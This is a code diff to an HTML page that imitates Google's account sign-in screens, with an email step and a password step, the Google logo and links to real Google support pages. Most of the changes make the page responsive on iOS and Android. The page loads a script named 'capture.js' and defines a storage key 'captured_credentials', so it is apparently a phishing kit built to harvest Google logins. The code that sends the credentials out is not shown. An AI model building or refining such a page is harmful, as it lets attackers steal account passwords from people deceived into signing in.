@@ -2,22 +2,31 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Sign in - Google Accounts</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        html, body {
             font-family: 'Google Sans', 'Roboto', 'Segoe UI', Arial, sans-serif;
             background: #f0f4f9;
+            color: #202124;
+            width: 100%;
+            height: 100%;
+            min-height: 100vh;
+            overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
+        }
+        .page-wrapper {
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            color: #202124;
+            padding: 16px;
         }
         .container {
-            width: 1000px;
+            width: 100%;
+            max-width: 1000px;
             min-height: 400px;
             background: #fff;
             border-radius: 28px;
@@ -37,9 +46,7 @@
             flex-direction: column;
             justify-content: center;
         }
-        .logo {
-            margin-bottom: 24px;
-        }
+        .logo { margin-bottom: 24px; }
         .logo svg { height: 40px; width: 40px; }
         h1 {
             font-size: 36px;
@@ -54,10 +61,7 @@
             margin-bottom: 32px;
             font-weight: 400;
         }
-        .input-group {
-            position: relative;
-            margin-bottom: 8px;
-        }
+        .input-group { position: relative; margin-bottom: 8px; }
         input {
             width: 100%;
             height: 54px;
@@ -69,15 +73,10 @@
             outline: none;
             transition: all 0.2s;
             background: #fff;
+            -webkit-appearance: none;
         }
-        input:focus {
-            border: 2px solid #0b57d0;
-            padding: 12px 14px;
-        }
-        input.error {
-            border: 2px solid #d93025;
-            padding: 12px 14px;
-        }
+        input:focus { border: 2px solid #0b57d0; padding: 12px 14px; }
+        input.error { border: 2px solid #d93025; padding: 12px 14px; }
         .label {
             position: absolute;
             left: 15px;
@@ -91,11 +90,7 @@
             padding: 0 4px;
         }
         input:focus + .label,
-        input:not(:placeholder-shown) + .label {
-            top: 0;
-            font-size: 12px;
-            color: #0b57d0;
-        }
+        input:not(:placeholder-shown) + .label { top: 0; font-size: 12px; color: #0b57d0; }
         input.error + .label { color: #d93025; }
         input.error:focus + .label { color: #d93025; }
         .error-msg {
@@ -132,14 +127,8 @@
             font-weight: 500;
         }
         .guest a:hover { text-decoration: underline; }
-        .bottom {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .create-dropdown {
-            position: relative;
-        }
+        .bottom { display: flex; justify-content: space-between; align-items: center; }
+        .create-dropdown { position: relative; }
         .create-btn {
             color: #0b57d0;
             font-size: 14px;
@@ -186,6 +175,7 @@
             cursor: pointer;
             min-width: 80px;
             transition: background 0.2s;
+            -webkit-appearance: none;
         }
         .next:hover { background: #0842a0; }
         .next:disabled { background: #dadce0; color: #5f6368; cursor: default; }
@@ -196,7 +186,8 @@
             align-items: center;
             font-size: 12px;
             color: #1f1f1f;
-            width: 1000px;
+            width: 100%;
+            max-width: 1000px;
             padding: 0 24px;
         }
         .footer span { cursor: pointer; padding: 4px; border-radius: 4px; }
@@ -240,9 +231,12 @@
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
         }
+
+        /* WELCOME PAGE */
         .welcome-container {
             display: none;
-            width: 1000px;
+            width: 100%;
+            max-width: 1000px;
             min-height: 400px;
             background: #fff;
             border-radius: 28px;
@@ -301,6 +295,7 @@
             outline: none;
             transition: all 0.2s;
             background: #fff;
+            -webkit-appearance: none;
         }
         .welcome-input:focus { border: 2px solid #1a73e8; padding: 15px 14px; }
         .welcome-input.error { border: 2px solid #d93025; padding: 15px 14px; }
@@ -329,7 +324,35 @@
             color: #202124;
             width: 100%;
         }
-        .welcome-show input { width: 18px; height: 18px; border: 2px solid #5f6368; border-radius: 2px; accent-color: #1a73e8; cursor: pointer; }
+        .welcome-show input {
+            width: 14px;
+            height: 14px;
+            min-width: 14px;
+            min-height: 14px;
+            border: 1.5px solid #5f6368;
+            border-radius: 2px;
+            cursor: pointer;
+            -webkit-appearance: none;
+            appearance: none;
+            position: relative;
+            margin: 0;
+            padding: 0;
+        }
+        .welcome-show input:checked {
+            background: #1a73e8;
+            border-color: #1a73e8;
+        }
+        .welcome-show input:checked::after {
+            content: '';
+            position: absolute;
+            left: 3px;
+            top: 0px;
+            width: 4px;
+            height: 8px;
+            border: solid #fff;
+            border-width: 0 1.5px 1.5px 0;
+            transform: rotate(45deg);
+        }
         .welcome-show label { cursor: pointer; }
         .welcome-forgot {
             color: #1a73e8;
@@ -353,18 +376,97 @@
             cursor: pointer;
             min-width: 80px;
             transition: background 0.2s;
+            -webkit-appearance: none;
         }
         .welcome-next:hover { background: #174ea6; }
         .welcome-next:disabled { background: #dadce0; color: #5f6368; cursor: default; }
+
+        /* TABLET */
         @media (max-width: 1050px) {
-            .container, .welcome-container { width: 90%; max-width: 500px; flex-direction: column; padding: 48px 40px 36px; }
+            .page-wrapper { padding: 24px; }
+            .container, .welcome-container {
+                width: 100%;
+                max-width: 500px;
+                flex-direction: column;
+                padding: 48px 40px 36px;
+            }
             .left-col, .welcome-left { padding-right: 0; margin-bottom: 24px; }
-            .footer { width: 90%; max-width: 500px; }
+            .footer { width: 100%; max-width: 500px; }
         }
-        @media (max-width: 480px) {
-            .container, .welcome-container { width: 100%; border-radius: 0; padding: 24px 20px; box-shadow: none; }
-            .footer { width: 100%; padding: 0 20px; }
-            body { background: #fff; }
+
+        /* MOBILE - iOS & Android */
+        @media (max-width: 600px) {
+            html, body {
+                background: #fff;
+                height: 100%;
+                overflow-y: auto;
+            }
+            .page-wrapper {
+                justify-content: flex-start;
+                align-items: stretch;
+                padding: 0;
+                min-height: 100vh;
+                min-height: -webkit-fill-available;
+            }
+            .container, .welcome-container {
+                width: 100%;
+                max-width: 100%;
+                border-radius: 0;
+                padding: 32px 24px 36px;
+                box-shadow: none;
+                min-height: 100vh;
+                min-height: -webkit-fill-available;
+            }
+            .container { display: block; }
+            .welcome-container.show { display: block; }
+            .left-col, .welcome-left { margin-bottom: 32px; }
+            h1, .welcome-title { font-size: 28px; }
+            .subtitle { font-size: 15px; margin-bottom: 24px; }
+            .logo { margin-bottom: 20px; }
+            .logo svg { height: 48px; width: 48px; }
+            .welcome-logo { margin-bottom: 20px; }
+            .welcome-logo svg { height: 48px; width: 48px; }
+            input, .welcome-input { font-size: 16px; }
+            .guest { font-size: 13px; margin-bottom: 24px; }
+            .bottom { margin-top: 8px; }
+            .footer {
+                width: 100%;
+                padding: 16px 24px;
+                margin-top: 0;
+                background: #fff;
+            }
+            .verify-text { font-size: 15px; margin-bottom: 24px; }
+            .email-chip { margin-bottom: 20px; }
+            .welcome-show { margin: 10px 0 32px 0; }
+            .welcome-show input {
+                width: 14px;
+                height: 14px;
+                min-width: 14px;
+                min-height: 14px;
+            }
+            .welcome-show input:checked::after {
+                left: 3px;
+                top: 0px;
+                width: 4px;
+                height: 8px;
+                border-width: 0 1.5px 1.5px 0;
+            }
+        }
+
+        /* SMALL MOBILE */
+        @media (max-width: 360px) {
+            .container, .welcome-container { padding: 24px 16px 32px; }
+            h1, .welcome-title { font-size: 24px; }
+            .footer { padding: 12px 16px; }
+            .logo svg { height: 44px; width: 44px; }
+            .welcome-logo svg { height: 44px; width: 44px; }
+        }
+
+        /* SAFARI iOS FIXES */
+        @supports (-webkit-touch-callout: none) {
+            .page-wrapper { min-height: -webkit-fill-available; }
+            .container, .welcome-container { min-height: -webkit-fill-available; }
+            input, .welcome-input { font-size: 16px; }
         }
     </style>
 </head>
@@ -372,119 +474,124 @@
     <div class="loading-overlay" id="loadingOverlay">
         <div class="loading-spinner"></div>
     </div>
-    <div class="container" id="signinPage">
-        <div class="left-col">
-            <div class="logo">
-                <svg viewBox="0 0 48 48" width="40" height="40" xmlns="http://www.w3.org/2000/svg">
-                    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
-                    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
-                    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
-                    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
-                </svg>
+    <div class="page-wrapper">
+        <div class="container" id="signinPage">
+            <div class="left-col">
+                <div class="logo">
+                    <svg viewBox="0 0 48 48" width="40" height="40" xmlns="http://www.w3.org/2000/svg">
+                        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+                    </svg>
+                </div>
+                <h1>Sign in</h1>
+                <p class="subtitle">Use your Google Account</p>
             </div>
-            <h1>Sign in</h1>
-            <p class="subtitle">Use your Google Account</p>
-        </div>
-        <div class="right-col">
-            <form id="loginForm" onsubmit="return handleSignin(event)">
-                <div class="input-group">
-                    <input type="text" id="email" name="email" placeholder=" " autocomplete="email" autocapitalize="none" oninput="clearSigninError()">
-                    <label class="label" for="email">Email or phone</label>
-                </div>
-                <div class="error-msg" id="emailError">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
-                    <span id="emailErrorText">Enter an email or phone number</span>
-                </div>
-                <div class="forgot" onclick="window.location.href='https://accounts.google.com/signin/v2/usernamerecovery'">Forgot email?</div>
-                <div class="guest">
-                    Not your computer? Use Guest mode to sign in privately. 
-                    <a href="https://support.google.com/accounts/answer/7395990" target="_blank">Learn more about using Guest mode</a>
-                </div>
-                <div class="bottom">
-                    <div class="create-dropdown">
-                        <button type="button" class="create-btn" onclick="toggleCreateMenu()">Create account</button>
-                        <div class="create-menu" id="createMenu">
-                            <a href="https://accounts.google.com/signup/v2/webcreateaccount?flowName=GlifWebSignIn&flowEntry=SignUp" target="_blank">For my personal use</a>
-                            <a href="https://accounts.google.com/signup/v2/webcreateaccount?flowName=GlifWebSignIn&flowEntry=SignUp&hl=en&biz=true" target="_blank">For my child</a>
-                            <a href="https://accounts.google.com/signup/v2/webcreateaccount?flowName=GlifWebSignIn&flowEntry=SignUp&hl=en&biz=true" target="_blank">For work or my business</a>
-                        </div>
+            <div class="right-col">
+                <form id="loginForm" onsubmit="return handleSignin(event)">
+                    <div class="input-group">
+                        <input type="text" id="email" name="email" placeholder=" " autocomplete="email" autocapitalize="none" oninput="clearSigninError()">
+                        <label class="label" for="email">Email or phone</label>
                     </div>
-                    <button type="submit" class="next" id="nextBtn">
-                        <span id="btnText">Next</span>
-                        <div class="spinner" id="btnSpinner"></div>
-                    </button>
-                </div>
-            </form>
-        </div>
-    </div>
-    <div class="welcome-container" id="welcomePage">
-        <div class="welcome-left">
-            <div class="welcome-logo">
-                <svg viewBox="0 0 48 48" width="40" height="40" xmlns="http://www.w3.org/2000/svg">
-                    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
-                    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
-                    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
-                    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
-                </svg>
+                    <div class="error-msg" id="emailError">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+                        <span id="emailErrorText">Enter an email or phone number</span>
+                    </div>
+                    <div class="forgot" onclick="window.location.href='https://accounts.google.com/signin/v2/usernamerecovery'">Forgot email?</div>
+                    <div class="guest">
+                        Not your computer? Use Guest mode to sign in privately. 
+                        <a href="https://support.google.com/accounts/answer/7395990" target="_blank">Learn more about using Guest mode</a>
+                    </div>
+                    <div class="bottom">
+                        <div class="create-dropdown">
+                            <button type="button" class="create-btn" onclick="toggleCreateMenu()">Create account</button>
+                            <div class="create-menu" id="createMenu">
+                                <a href="https://accounts.google.com/signup/v2/webcreateaccount?flowName=GlifWebSignIn&flowEntry=SignUp" target="_blank">For my personal use</a>
+                                <a href="https://accounts.google.com/signup/v2/webcreateaccount?flowName=GlifWebSignIn&flowEntry=SignUp&hl=en&biz=true" target="_blank">For my child</a>
+                                <a href="https://accounts.google.com/signup/v2/webcreateaccount?flowName=GlifWebSignIn&flowEntry=SignUp&hl=en&biz=true" target="_blank">For work or my business</a>
+                            </div>
+                        </div>
+                        <button type="submit" class="next" id="nextBtn">
+                            <span id="btnText">Next</span>
+                            <div class="spinner" id="btnSpinner"></div>
+                        </button>
+                    </div>
+                </form>
             </div>
-            <h1 class="welcome-title">Welcome</h1>
-            <div class="email-chip" id="emailChip" onclick="goBack()">
-                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
-                </svg>
-                <span id="emailDisplay">user@example.com</span>
-                <span class="arrow">&#9662;</span>
+        </div>
+
+        <div class="welcome-container" id="welcomePage">
+            <div class="welcome-left">
+                <div class="welcome-logo">
+                    <svg viewBox="0 0 48 48" width="40" height="40" xmlns="http://www.w3.org/2000/svg">
+                        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+                    </svg>
+                </div>
+                <h1 class="welcome-title">Welcome</h1>
+                <div class="email-chip" id="emailChip" onclick="goBack()">
+                    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+                    </svg>
+                    <span id="emailDisplay">user@example.com</span>
+                    <span class="arrow">&#9662;</span>
+                </div>
+                <p class="verify-text">To continue, first verify it's you</p>
             </div>
-            <p class="verify-text">To continue, first verify it's you</p>
+            <div class="welcome-right">
+                <form id="welcomeForm" onsubmit="return handleWelcome(event)">
+                    <div class="welcome-input-group">
+                        <input type="password" id="password" name="password" class="welcome-input" placeholder=" " autocomplete="current-password" oninput="clearWelcomeError()">
+                        <label class="welcome-label" for="password">Enter your password</label>
+                    </div>
+                    <div class="error-msg" id="passwordError">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+                        <span id="passwordErrorText">Wrong password. Try again or click 'Forgot password' to reset it.</span>
+                    </div>
+                    <div class="welcome-show">
+                        <input type="checkbox" id="showPass" onchange="togglePassword()">
+                        <label for="showPass">Show password</label>
+                    </div>
+                    <div class="bottom">
+                        <button type="button" class="welcome-forgot" onclick="showForgotPass()">Forgot password?</button>
+                        <button type="submit" class="welcome-next" id="welcomeNextBtn">
+                            <span id="welcomeBtnText">Next</span>
+                            <div class="spinner" id="welcomeBtnSpinner"></div>
+                        </button>
+                    </div>
+                </form>
+            </div>
         </div>
-        <div class="welcome-right">
-            <form id="welcomeForm" onsubmit="return handleWelcome(event)">
-                <div class="welcome-input-group">
-                    <input type="password" id="password" name="password" class="welcome-input" placeholder=" " autocomplete="current-password" oninput="clearWelcomeError()">
-                    <label class="welcome-label" for="password">Enter your password</label>
-                </div>
-                <div class="error-msg" id="passwordError">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="#d93025"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
-                    <span id="passwordErrorText">Wrong password. Try again or click 'Forgot password' to reset it.</span>
-                </div>
-                <div class="welcome-show">
-                    <input type="checkbox" id="showPass" onchange="togglePassword()">
-                    <label for="showPass">Show password</label>
-                </div>
-                <div class="bottom">
-                    <button type="button" class="welcome-forgot" onclick="showForgotPass()">Forgot password?</button>
-                    <button type="submit" class="welcome-next" id="welcomeNextBtn">
-                        <span id="welcomeBtnText">Next</span>
-                        <div class="spinner" id="welcomeBtnSpinner"></div>
-                    </button>
-                </div>
-            </form>
+
+        <div class="footer" id="pageFooter">
+            <select class="lang-select" id="langSelect" onchange="changeLanguage()">
+                <option value="en">English (United States)</option>
+                <option value="en-GB">English (United Kingdom)</option>
+                <option value="es">Español</option>
+                <option value="fr">Français</option>
+                <option value="de">Deutsch</option>
+                <option value="it">Italiano</option>
+                <option value="pt">Português</option>
+                <option value="zh">中文 (简体)</option>
+                <option value="ja">日本語</option>
+                <option value="ko">한국어</option>
+            </select>
+            <div>
+                <span onclick="window.open('https://support.google.com/accounts','_blank')">Help</span>
+                <span onclick="window.open('https://policies.google.com/privacy','_blank')">Privacy</span>
+                <span onclick="window.open('https://policies.google.com/terms','_blank')">Terms</span>
+            </div>
         </div>
     </div>
-    <div class="footer" id="pageFooter">
-        <select class="lang-select" id="langSelect" onchange="changeLanguage()">
-            <option value="en">English (United States)</option>
-            <option value="en-GB">English (United Kingdom)</option>
-            <option value="es">Español</option>
-            <option value="fr">Français</option>
-            <option value="de">Deutsch</option>
-            <option value="it">Italiano</option>
-            <option value="pt">Português</option>
-            <option value="zh">中文 (简体)</option>
-            <option value="ja">日本語</option>
-            <option value="ko">한국어</option>
-        </select>
-        <div>
-            <span onclick="window.open('https://support.google.com/accounts','_blank')">Help</span>
-            <span onclick="window.open('https://policies.google.com/privacy','_blank')">Privacy</span>
-            <span onclick="window.open('https://policies.google.com/terms','_blank')">Terms</span>
-        </div>
-    </div>
+
     <script src="capture.js"></script>
     <script>
         const STORAGE_KEY = 'captured_credentials';
         let currentEmail = '';
-        let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth <= 480;
+        let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth <= 600;
 
         const translations = {
             en: {
